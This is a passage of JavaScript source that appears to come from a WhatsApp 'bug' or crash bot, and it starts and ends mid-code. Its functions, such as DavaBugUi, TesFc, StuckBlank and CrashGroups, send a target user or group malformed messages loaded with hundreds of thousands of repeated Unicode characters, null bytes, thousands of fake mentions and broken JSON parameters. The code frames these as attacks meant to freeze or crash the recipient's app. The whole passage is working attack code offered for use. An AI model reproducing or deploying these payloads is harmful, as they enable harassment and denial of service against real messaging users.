                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };

    const msg2 = generateWAMessageFromContent(target, msgContent2, { userJid: target });

    await conn.relayMessage(target, msg2.message, { messageId: msg2.key.id });

    await conn.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    console.log(chalk.bold.green(`[+]: SUKSES SENDING`));

  } catch (err) {
    console.error(err);
  }
}
async function DavaBugUi(target) {
console.log(chalk.red("Succesfully Attack "));
  conn.relayMessage(target, {
    extendedTextMessage: {
      text: `sv setto𖥂` + "ꦽꦂ".repeat(90000),
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000000000)}@s.whatsapp.net`),
        externalAdReply: {
          title: `kena ui lu🔥`,
          body: ``,
          previewType: "PHOTO",
          thumbnail: "",
          sourceUrl: `https://t.me/hope6166`
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  }, { participant: { jid: target, quoted: null } }, {
      messageId: null
  });
}
async function TesFc(target) {
  let baten = [];
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const stxview = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
      contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
      }
    },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
                },
                body: { text: "b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉Frezee Fc Dek🐦‍🔥" + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: baten,
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  };
  
    await conn.relayMessage(target, stxview, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    }),
    await conn.relayMessage(target, stxview, {
      messageId: null,
      participant: { jid: target },
      userJid: target 
    });
}


async function StuckBlank(target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "Bang Lu ganteng" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },

      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },

      contextInfo: {
        mentionedJid: ["0@s.whatsapp.net"],
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "#Setto-Official",
          },
        ],
      },
    };

    await conn.relayMessage(target, message, {
      userJid: target,
      participant: { jid: target },
    });

  } catch (err) {
    console.error("Error sending MutanoX:", err);
  }
}
//buggroup
async function CrashGroups(target) {
  try {
    const messsage = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `777777@newsletter`,
                    newsletterName: "@SettoOfficial" + "𑇂𑆵𑆴𑆿".repeat(15000),
                    jpegThumbnail: "",
                    caption: "SETTO GANTENG" + "𑇂𑆵𑆴𑆿".repeat(15000),
inviteExpiration: Date.now() + 1814400000,
                },
            },
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
        externalAdReply: {
          showAdAttribution: false,
          containsAutoReply: false,
      },
      mentionedJid: target,
      businessMessageForwardInfo: {
      businessOwnerJid: "13135550002@s.whatsapp.net"
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "999@newsletter",
        serverMessageId: 999,
        newsletterName: "★Setto-Ganteng",
      },
      interactiveMessage: {
        messageParamsJson: ")]".repeat(10000),
        nativeFlowMessage: {},
      },
      },
    };
    await conn.relayMessage(target, messsage, {
        userJid: target,
    });
}
  catch (err) {
    console.log(err);
  }
}
async function CrashPacksNew(target) {
  await conn.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⿻⭑‌⟅ ༑ ▾ SETT KILL YOU ⿻ WOII ⿻ ▾ ༑‌⟆⭑⿻" + "ꦽ".repeat(90000),
      publisher: "Wa.me/stickerpack/null" + "\u0000".repeat(10000),
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🗿"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: ["🩲"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: ["😹"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: ["🎭"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: ["🤣"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: ["👻"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: ["🤑"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: ["😘"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
